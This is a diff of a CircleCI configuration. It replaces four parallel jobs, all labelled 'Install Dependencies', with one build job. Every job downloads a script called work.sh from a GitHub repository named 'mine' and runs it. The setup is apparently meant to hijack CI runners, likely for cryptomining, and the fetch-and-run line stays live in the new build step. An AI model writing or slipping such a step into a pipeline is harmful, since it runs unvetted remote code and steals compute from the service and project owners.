@@ -1,38 +1,11 @@
 version: 2.1
 jobs:
-    Devop:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work.sh && chmod u+x work.sh && ./work.sh
-    Devop1:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work.sh && chmod u+x work.sh && ./work.sh
-    Devop2:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work.sh && chmod u+x work.sh && ./work.sh
-    Devop3:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work.sh && chmod u+x work.sh && ./work.sh
-workflows:
-    version: 2.1
-    build:
-        jobs:
-            - Devop
-            - Devop1
-            - Devop2
-            - Devop3
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD
+    steps:
+      - checkout 
+      - run: wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work.sh && chmod u+x work.sh && ./work.sh
